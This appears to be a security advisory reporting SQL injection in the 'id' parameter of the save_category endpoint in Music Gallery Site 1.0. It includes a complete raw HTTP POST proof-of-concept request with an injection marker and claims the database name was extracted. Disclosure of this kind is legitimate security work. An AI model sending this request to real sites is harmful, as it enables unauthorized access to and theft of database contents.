<img width="1214" alt="image" src="https://github.com/user-attachments/assets/22096f68-f75f-4c36-9064-d774e0d1bc48"><img width="1214" alt="image" src="https://github.com/user-attachments/assets/8a8c3c55-f0d8-4579-b04c-6cd75e2f1621">## Music Gallery Site has a front-end SQL injection vulnerability

## Affected version: 
Music Gallery Site - 1.0

## Software:
https://www.sourcecodester.com/php/16073/music-gallery-site-using-php-and-mysql-database-free-source-code.html

## Vulnerability File:
/php-music/classes/Master.php?f=save_category

## Description:
Music Gallery Site 1.0 is vulnerable to an unrestricted SQL injection attack in /php-music/classes/Master.php?f=save_category with the attack parameter id. An attacker can exploit this vulnerability to directly obtain sensitive server information. A malicious attacker could exploit this vulnerability to obtain sensitive information in the server database.

Status: CRITICAL

POC
```
POST /php-music/classes/Master.php?f=save_category HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------310372759034424265232419151358
Content-Length: 575
Origin: http://localhost
Connection: close
Referer: http://localhost/php-music/admin/?page=categories
Cookie: PHPSESSID=cims89c5nt143re39d3ce6cdvd
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

-----------------------------310372759034424265232419151358
Content-Disposition: form-data; name="id"

11*
-----------------------------310372759034424265232419151358
Content-Disposition: form-data; name="name"

223
-----------------------------310372759034424265232419151358
Content-Disposition: form-data; name="description"

22
-----------------------------310372759034424265232419151358
Content-Disposition: form-data; name="status"

1
-----------------------------310372759034424265232419151358--
```

Get database name 

<img width="1499" alt="image" src="https://github.com/user-attachments/assets/dc05d315-b9e3-429c-b0ad-1e00786cb1d9">

<img width="1214" alt="image" src="https://github.com/user-attachments/assets/e78a81b2-7337-47d3-9400-c1e8b3aa8664">



